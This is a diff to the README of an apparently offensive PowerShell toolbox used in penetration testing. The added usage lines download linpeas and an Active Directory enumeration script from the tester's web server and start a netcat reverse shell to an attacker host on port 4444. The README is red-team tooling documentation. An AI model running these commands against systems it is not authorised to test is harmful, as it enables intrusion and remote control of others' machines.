@@ -26,7 +26,7 @@ Navigate to the cloned repository and ensure the loadables directory contains al
 Run the provided Python web server script, postserver.py, to serve the content of the loadables directory.
 
     python3 python/postserver.py -b 0.0.0.0 -p 8443 -u ~/uploads
-***NOTE:  The uploads dir is being set OUTSIDE of the loadables folder.  This will make your Get-TollboxItems (gti) run more efficiently later if you so choose to use it. Otherwise if you are ok waiting you can keep it in your loadables folder. 
+*NOTE:  The uploads dir is being set OUTSIDE of the loadables folder.  This will make your Get-TollboxItems (gti) run more efficiently later if you so choose to use it. Otherwise if you are ok waiting you can keep it in your loadables folder. 
 
 # Usage
 
@@ -38,6 +38,25 @@ powershell
 
 You will be prompted for your ip and the web server port.
 
-
+	#Show the current config
+	Show-PSToolboxConfig
+-
+	#Reset the config
+	Set-PSToolboxConfig
+-
+	#Download all linked files that match linpeas	
+	gti -m linpeas
+-	
+	#Download a single toolbox item instead of doing a recursive search
+	Get-SingleToolboxItem -item 'enum/adenumv2.ps1'
+-
+	#download single item and save with different name
+	Get-SingleToolboxItem -item 'enum/adenumv2.ps1' -name 'ad.ps1'
+-
+	#Start a netcat reverse shell to the attacker host
+	Start-Shell -Type NC -port 4444
+-
 This project is licensed under the MIT License - see the LICENSE.md file for details.
 Acknowledgments
+
+
